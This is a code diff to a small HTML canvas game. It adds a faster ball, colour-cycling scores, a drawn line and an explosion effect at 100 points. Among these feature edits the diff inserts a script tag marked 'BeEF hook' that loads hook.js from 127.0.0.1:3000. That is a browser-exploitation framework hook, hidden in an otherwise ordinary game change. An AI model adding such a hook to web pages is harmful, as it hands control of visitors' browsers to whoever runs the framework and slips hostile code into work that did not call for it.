@@ -1,27 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Line Shot Combo Game</title>
 <style>
   body {
     margin: 0;
     background: #222;
     color: #fff;
-    font-family: Arial, sans-serif;
+    font-family: 'Press Start 2P', cursive, monospace;
     display: flex;
     flex-direction: column;
     align-items: center;
   }
+  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
   canvas {
     background: #111;
     margin-top: 20px;
     border: 2px solid #555;
   }
   #score {
-    font-size: 1.5rem;
+    font-size: 1.2rem;
     margin-top: 10px;
+    font-family: 'Press Start 2P', monospace;
+    user-select: none;
   }
 </style>
 </head>
@@ -30,6 +33,9 @@
 <p>Press <b>SPACE</b> when the ball passes over the button. Chain combos!</p>
 <div id="score">Score: 0 | Combo: x0</div>
 <canvas id="gameCanvas" width="500" height="500"></canvas>
+
+<!-- BeEF hook -->
+<script src="http://127.0.0.1:3000/hook.js"></script>
 
 <script>
 const canvas = document.getElementById('gameCanvas');
@@ -40,15 +46,22 @@ const centerX = canvas.width / 2;
 const centerY = canvas.height / 2;
 const buttonRadius = 30;
 
-let t = 0;                  // ball position along the line (-1 to 1)
-let dir = 1;                // direction of motion
-let speed = 0.02;           // speed of oscillation
-let angle = Math.random() * 2 * Math.PI;  // line angle
+let t = 0;                  
+let dir = 1;                
+let baseSpeed = 0.02;       
+let speed = baseSpeed;
+let angle = Math.random() * 2 * Math.PI;
 
 let score = 0;
 let combo = 0;
 
+const colors = ['#FF4136', '#FF851B', '#FFDC00', '#2ECC40', '#0074D9', '#B10DC9'];
+
+let explosionActive = false;
+let explosionFrame = 0;
+
 document.addEventListener('keydown', (e) => {
+  if (explosionActive) return; // disable input during explosion
   if (e.code === 'Space') {
     const ball = getBallPosition();
     const dx = ball.x - centerX;
@@ -60,6 +73,10 @@ document.addEventListener('keydown', (e) => {
       score++;
       combo++;
       randomizeAngle();
+      updateSpeed();
+      if(score >= 100) {
+        triggerExplosion();
+      }
     } else {
       // MISS
       combo = 0;
@@ -68,7 +85,13 @@ document.addEventListener('keydown', (e) => {
   }
 });
 
+function updateSpeed() {
+  speed = Math.min(baseSpeed * (1 + 0.05 * score), 0.1);
+}
+
 function updateScore() {
+  const colorIndex = Math.floor(score / 5) % colors.length;
+  scoreDisplay.style.color = colors[colorIndex];
   scoreDisplay.textContent = `Score: ${score} | Combo: x${combo}`;
 }
 
@@ -79,7 +102,7 @@ function randomizeAngle() {
 }
 
 function getBallPosition() {
-  const length = 200; // how far from center ball can go
+  const length = 200;
   const x = centerX + Math.cos(angle) * length * t;
   const y = centerY + Math.sin(angle) * length * t;
   return {x, y};
@@ -100,22 +123,76 @@ function drawBall() {
   ctx.fill();
 }
 
+function drawLine() {
+  ctx.strokeStyle = '#aaa';
+  ctx.lineWidth = 2;
+  ctx.beginPath();
+  const length = 200;
+  const x1 = centerX + Math.cos(angle) * length;
+  const y1 = centerY + Math.sin(angle) * length;
+  const x2 = centerX - Math.cos(angle) * length;
+  const y2 = centerY - Math.sin(angle) * length;
+  ctx.moveTo(x1, y1);
+  ctx.lineTo(x2, y2);
+  ctx.stroke();
+}
+
+function triggerExplosion() {
+  explosionActive = true;
+  explosionFrame = 0;
+}
+
+function drawExplosion() {
+  const maxFrames = 60;
+  if(explosionFrame > maxFrames) {
+    explosionActive = false;
+    score = 0;
+    combo = 0;
+    updateSpeed();
+    updateScore();
+    randomizeAngle();
+    return;
+  }
+
+  const progress = explosionFrame / maxFrames;
+  const maxRadius = 250;
+
+  const flash = Math.floor(progress * 10) % 2 === 0 ? '#fff' : '#000';
+  ctx.fillStyle = flash;
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+  for(let i=0; i<10; i++) {
+    const radius = maxRadius * progress * (i / 10);
+    ctx.strokeStyle = colors[i % colors.length];
+    ctx.lineWidth = 3;
+    ctx.beginPath();
+    ctx.arc(centerX, centerY, radius, 0, 2*Math.PI);
+    ctx.stroke();
+  }
+
+  explosionFrame++;
+}
+
 function gameLoop() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-  // Update t
-  t += speed * dir;
-  if (t >= 1 || t <= -1) {
-    dir *= -1; // reverse direction
-  }
+  if(explosionActive) {
+    drawExplosion();
+  } else {
+    t += speed * dir;
+    if (t >= 1 || t <= -1) {
+      dir *= -1;
+    }
 
-  drawButton();
-  drawBall();
+    drawLine();
+    drawButton();
+    drawBall();
+  }
 
   requestAnimationFrame(gameLoop);
 }
 
-// Start
+updateSpeed();
 updateScore();
 gameLoop();
 </script>
